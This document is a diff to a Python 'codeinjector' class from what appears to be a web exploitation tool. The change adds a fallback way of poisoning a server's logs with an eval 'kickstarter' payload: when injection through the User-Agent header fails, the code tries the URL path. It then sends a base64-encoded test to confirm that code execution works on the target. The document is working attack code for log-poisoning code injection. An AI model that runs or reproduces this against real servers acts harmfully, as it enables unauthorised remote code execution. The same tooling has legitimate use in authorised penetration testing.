@@ -399,8 +399,9 @@ class codeinjector(baseClass):
                 if (postdata != ""):
                     p = "%s&%s" %(postdata, p)
                 code = self.doPostRequest(url, p)
+                #TODO: Cleanup this dirty block :)
                 if (code.find(testcode[1]) == -1):
-                    self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
+                    self._log("Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
                     kickstarter = langClass.getEvalKickstarter()
                     ua = self.getUserAgent()
                     self.setUserAgent(kickstarter)
@@ -420,10 +421,33 @@ class codeinjector(baseClass):
                     code = self.doPostRequest(url, p, additionalHeaders = headerDict)
 
                     if (code.find(testcode[1]) == -1):
-                        self._log("Failed to inject kickstarter!", self.LOG_ERROR)
-                        sys.exit(1)
+                        self._log("Failed to inject kickstarter thru UserAgent!", self.LOG_ERROR)
+                        self._log("Trying to inject kickstarter thru Path...", self.LOG_INFO)
+                        self._log("Ignore any 404 errors for the next request.", self.LOG_INFO)
+                        kickstarter = langClass.getEvalKickstarter()
+                        tmpurl = None
+                        if (url.find("?") != -1):
+                            tmpurl = url[:url.find("?")]
+                        else:
+                            tmpurl = url
+                        tmpurl += "?" + kickstarter
+                        self.doGetRequest(tmpurl, additionalHeaders = headerDict)
+                        
+                        self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
+                        testcode = langClass.generateQuiz()
+                        p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
+                        if (postdata != ""):
+                            p = "%s&%s" %(postdata, p)
+                        code = self.doPostRequest(url, p, additionalHeaders = headerDict)
+                        
+                        if (code.find(testcode[1]) != -1):
+                            self._log("Kickstarter successfully injected thru Path!", self.LOG_INFO)
+                            self.isLogKickstarterPresent = True
+                        else:
+                            self._log("Failed to inject kickstarter thru Path!", self.LOG_ERROR)
+                            sys.exit(1)
                     else:
-                        self._log("Kickstarter successfully injected!", self.LOG_INFO)
+                        self._log("Kickstarter successfully injected! thru UserAgent!", self.LOG_INFO)
                         self.isLogKickstarterPresent = True
                 else:
                     self._log("Kickstarter found!", self.LOG_INFO)
